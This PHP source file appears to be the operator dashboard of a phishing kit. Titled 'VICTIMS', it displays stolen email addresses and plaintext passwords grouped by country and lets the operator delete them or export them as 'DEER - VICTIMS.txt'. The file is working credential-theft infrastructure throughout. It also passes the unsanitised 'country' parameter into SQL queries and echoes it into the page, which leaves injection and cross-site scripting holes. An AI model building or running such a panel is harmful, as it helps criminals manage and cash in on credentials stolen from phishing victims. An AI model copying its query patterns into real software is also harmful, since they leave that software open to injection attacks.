<?php
session_start();
require('conn.php');
if(!isset($_SESSION['user_name']))
{
    header("Location:login.php");
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
	 <meta charset="UTF-8">
		<meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1"/>
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css"/>
		<script type="text/javascript" src="downloadFile.js"></script>
		<style>
		     
.select {
  display:flex;
  flex-direction: column;
  position:relative;
  width:350px;
  height:40px;
}
 
.option {
  padding:0 30px 0 10px;
  min-height:40px;
  display:flex;
  align-items:center;
  background:  #E5E5E5;
  border-top:#222 solid 1px;
  position:absolute;
  top:0;
  width: 100%;
  pointer-events:none;
  order:2;
  z-index:1;
  transition:background .4s ease-in-out;
  box-sizing:border-box;
  overflow:hidden;
  white-space:nowrap;
  
}
 
.option:hover {
  background: #FF595C;
}
 
.select:focus .option {
  position:relative;
  pointer-events:all;
}
 
		</style>
	</head>
<body>
	<nav class="navbar navbar-default">
		<div class="container-fluid">
		
		</div>
	</nav>
	<div class="col-md-3"></div>
	<div class="col-md-6 well">
		<h3 class="text-primary">VICTIMS (	<?php
include 'conn.php';
$sql = "SELECT * FROM users";
                                    if ($result=mysqli_query($con,$sql)) {
                                        $rowcount=mysqli_num_rows($result);
                                        echo $rowcount;
                                    }
?> )&nbsp;&nbsp;<a href="index.php" class="btn btn-success" >Back</a> </h3>
	

		<hr style="border-top:1px dotted #ccc;"/>
		   <center>
        <form  id="form_id" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="get">
            <select id="contact" name="country" class="badge badge-gradient-warning" onchange="this.form.submit()">
                <option selected >Choose Country</option>
                <?php 
				$filter_country = mysqli_query($con,"SELECT DISTINCT country FROM users");
				if(isset($_GET['country']))
{
    $country_selected = $_GET['country'];
    $fetch_victims = mysqli_query($con,"SELECT * FROM users WHERE country = '$country_selected' ORDER BY id DESC ");
}
else
{
    $fetch_victims = mysqli_query($con,"SELECT * FROM users  ORDER BY id DESC ");
}
				while($country_name = mysqli_fetch_array($filter_country)) { ?>
                <option style="background: #009966; color: #FFF;" value="<?php echo $country_name['country'] ?>"><?php echo $country_name['country'] ?></option>
                <?php } ?>
            </select>
            <a class="badge badge-gradient-danger" href="victims.php">reset</a>
        </form></br>
		</center>
		  <?php
        
            if(isset($_GET['country']))
            {
                echo ' <center><h3 class="text-primary">TOTAL&nbsp;&nbsp;(&nbsp;'. mysqli_num_rows($fetch_victims );
                echo ' )</h3>';
                echo ' </center>';
             echo '<button type="button" class="btn btn-danger pull-right" data-target="#modal_confirma" data-toggle="modal"><span class="glyphicon glyphicon-trash"></span> Delete ' .'"' . $country_selected . '"' .  '</button>';
              
             echo '<a  id="save" type="button" onclick="exportData()" class="btn btn-success" ><span class="glyphicon glyphicon-download-alt"></span>  Download ' .'"' . $country_selected . '"' .  ' </a>';
               echo '&nbsp;&nbsp;&nbsp;&nbsp;<a  target="_blank" href="save.php?country='. $country_selected . '" class="btn btn-success" ><span class="glyphicon glyphicon-download-alt"></span>&nbsp;&nbsp; Save ' .'"' . $country_selected . '"' .  ' </a>';
       
            }
            else
            {
                echo '<button type="button" class="btn btn-danger pull-right" data-target="#modal_confirm" data-toggle="modal"><span class="glyphicon glyphicon-trash"></span> Delete All</button>';
               echo '<a  id="save" type="button" onclick="exportData()" class="btn btn-success" ><span class="glyphicon glyphicon-download-alt"></span>&nbsp;&nbsp;Download All</a>';
               echo '&nbsp;&nbsp;&nbsp;<a   href="save.php" target="_blank" class="btn btn-success" ><span class="glyphicon glyphicon-download-alt"></span>&nbsp;&nbsp;Save All</a>';
 }
        ?>
		<br /><br />
		<table class="table table-bordered" id="tblStocks" cellpadding="0" cellspacing="0">
			<thead class="alert-info">
				<tr>	
					<th>Country</th>
					<th>E-Mail</th>
					<th>Password</th>
				</tr>
			</thead>
			<tbody>
			
				<?php
					require 'conn.php';
					if(isset($_GET['country']))
{
    $country_selected = $_GET['country'];
    $fetch_victims = mysqli_query($con,"SELECT * FROM users WHERE country = '$country_selected' ORDER BY id DESC ");
}else{
	
					$fetch_victims = mysqli_query($con, "SELECT * FROM `users` ORDER BY `country` ASC") or die(mysqli_error());
}
					while($fetch = mysqli_fetch_array($fetch_victims)){
				?>
				<tr class="del_mem<?php echo $fetch['id']?>">
				    
					<td><?php echo $fetch['country']?></td>
					<td><?php echo $fetch['user']?></td>				
					<td><?php echo $fetch['pass']?></td>				
				</tr>
				<?php
					}
				?>
			</tbody>
		</table>
	
	</div>
	<div class="modal fade" id="modal_confirm" aria-hidden="true">
		<div class="modal-dialog modal-dialog-centered">
			<div class="modal-content">
				<div class="modal-header">
					<h3 class="modal-title">Delete ALL</h3>
				</div>
				<div class="modal-body">
					<center><h4>Are you sure you want to delete all Victims ?</h4></center>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-danger" data-dismiss="modal">No</button>
					<a type="button" class="btn btn-success" href="delete.php">Yes</a>
				</div>
			</div>
		</div>
	</div>

	<div class="modal fade" id="modal_confirma" aria-hidden="true">
		<div class="modal-dialog modal-dialog-centered">
			<div class="modal-content">
				<div class="modal-header">
					<h3 class="modal-title">Delete ALL Country Victims </h3>
				</div>
				<div class="modal-body">
					<center><h4>Are you sure you want to delete Selected Country Victims ?</h4></center>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-danger" data-dismiss="modal">No</button>
					<?php echo '<a  type="button"  class="btn btn-success"  href="delete.php?country='. $country_selected . '">Yes</a>'; ?>
				</div>
			</div>
		</div>
	</div>
<script>
function exportData(){
userDetails='';
$('table tbody tr').each(function(){
  var detail='';
  $(this).find('td').each(function(){
  	detail+=$(this).html()+':';
  });
  detail=detail.substring(0,detail.length-1);
  detail+='';
 userDetails+=detail+"\r\n";
});
var a=document.getElementById('save');
a.onclick=function(){
    var a = document.getElementById("save");
    var file = new Blob([userDetails], {type: 'text/plain'});
    a.href = URL.createObjectURL(file);
    a.download = "DEER - VICTIMS.txt";
}
}
</script>

<script src="js/jquery-3.2.1.min.js"></script>
<script src="js/bootstrap.js"></script>
</body>	
</html>